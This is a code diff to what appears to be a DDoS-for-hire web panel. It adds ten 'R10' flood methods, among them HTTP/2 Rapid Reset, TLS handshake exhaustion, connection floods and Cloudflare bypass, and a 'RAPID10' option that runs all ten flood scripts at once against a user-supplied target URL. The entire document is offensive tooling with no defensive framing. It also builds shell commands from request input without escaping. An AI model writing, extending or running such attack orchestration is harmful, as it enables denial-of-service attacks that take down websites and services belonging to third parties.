@@ -179,7 +179,17 @@ const methodFiles = {
   'HOLD-PANEL': 'methods/http-panel.js',
   'R1': 'methods/vhold.js',
   'UAM': 'methods/uam.js',
-  'W.I.L': 'methods/wil.js'
+  'W.I.L': 'methods/wil.js',
+  'R10-TCP': 'methods/r10-tcp.js',
+  'R10-TLS': 'methods/r10-tls.js',
+  'R10-CONN': 'methods/r10-conn.js',
+  'R10-HEADER': 'methods/r10-header.js',
+  'R10-FRAG': 'methods/r10-frag.js',
+  'R10-PIPE': 'methods/r10-pipe.js',
+  'R10-COOKIE': 'methods/r10-cookie.js',
+  'R10-MIXED': 'methods/r10-mixed.js',
+  'R10-LOWCPU': 'methods/r10-lowcpu.js',
+  'RAPID10': 'methods/r10-rapid.js' // Just for validation, actual execution is below
 };
 
 // Check if method files exist on startup
@@ -1194,16 +1204,33 @@ app.get('/', (req, res) => {
                         <div class="form-group">
                             <label class="form-label">// ATTACK METHOD</label>
                             <select id="method" class="form-select">
-                                <option>CF-BYPASS</option>
-                                <option>MODERN-FLOOD</option>
-                                <option>HTTP-SICARIO</option>
-                                <option>RAW-HTTP</option>
-                                <option>R9</option>
-                                <option>PRIV-TOR</option>
-                                <option>HOLD-PANEL</option>
-                                <option>R1</option>
-                                <option>UAM</option>
-                                <option>W.I.L</option>
+                                <optgroup label="🔥 RAPID10 - MEGA ATTACK">
+                                    <option value="RAPID10" style="color: #ff00ff; font-weight: bold; background: linear-gradient(90deg, #330033, #660066);">🚀 RAPID10 (ALL 10 METHODS)</option>
+                                </optgroup>
+                                <optgroup label="⚡ R10 SERIES - ULTRA FAST">
+                                    <option value="R10-RAPID" style="color: #ff3366;">R10-RAPID - HTTP/2 Rapid Reset</option>
+                                    <option value="R10-TCP" style="color: #ff3366;">R10-TCP - Raw Socket Flood</option>
+                                    <option value="R10-TLS" style="color: #ff3366;">R10-TLS - SSL Handshake Exhaust</option>
+                                    <option value="R10-CONN" style="color: #ff3366;">R10-CONN - Connection Tsunami</option>
+                                    <option value="R10-HEADER" style="color: #ff3366;">R10-HEADER - Header Bomber</option>
+                                    <option value="R10-FRAG" style="color: #ff3366;">R10-FRAG - Packet Fragment</option>
+                                    <option value="R10-PIPE" style="color: #ff3366;">R10-PIPE - HTTP Pipelining</option>
+                                    <option value="R10-COOKIE" style="color: #ff3366;">R10-COOKIE - Cookie Storm</option>
+                                    <option value="R10-MIXED" style="color: #ff3366;">R10-MIXED - Mixed Vector</option>
+                                    <option value="R10-LOWCPU" style="color: #ff3366;">R10-LOWCPU - Battery Saver</option>
+                                </optgroup>
+                                <optgroup label="🎯 CLASSIC METHODS">
+                                    <option value="CF-BYPASS">CF-BYPASS - Cloudflare Evasion</option>
+                                    <option value="MODERN-FLOOD">MODERN-FLOOD - HTTP/2 Flood</option>
+                                    <option value="HTTP-SICARIO">HTTP-SICARIO - Multi-Vector</option>
+                                    <option value="RAW-HTTP">RAW-HTTP - Raw Packet Flood</option>
+                                    <option value="R9">R9 - High-Dstat Combo</option>
+                                    <option value="PRIV-TOR">PRIV-TOR - TOR Routed</option>
+                                    <option value="HOLD-PANEL">HOLD-PANEL - Panel Hold</option>
+                                    <option value="R1">R1 - Full Spectrum</option>
+                                    <option value="UAM">UAM - Puppeteer Bypass</option>
+                                    <option value="W.I.L">W.I.L - Max Intensity</option>
+                                </optgroup>
                             </select>
                         </div>
                     </div>
@@ -1976,6 +2003,25 @@ app.get('/attack', authenticate, (req, res) => {
       execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
       execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
       break;
+    
+    case 'RAPID10':
+  console.log(`🔥🔥 RAPID10: LAUNCHING ALL 10 R10 VECTORS 🔥🔥`);
+  console.log(`Target: ${target} | Duration: ${timeNum}s | Intensity: MAXIMUM`);
+  
+  // Launch ALL 10 R10 scripts simultaneously
+  execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);     // HTTP/2 Rapid Reset
+  execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);             // TCP Cannon
+  execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);             // TLS Hammer
+  execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);            // Connection Tsunami
+  execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);     // Header Bomber
+  execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);            // Packet Fragment
+  execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);            // Request Pipeline
+  execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);          // Cookie Storm
+  execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);           // Mixed Vector
+  execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);     // Low CPU Optimized
+  
+  console.log(`✅ RAPID10: ALL 10 ATTACK VECTORS DEPLOYED`);
+  break;
       
     case 'UAM':
       execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
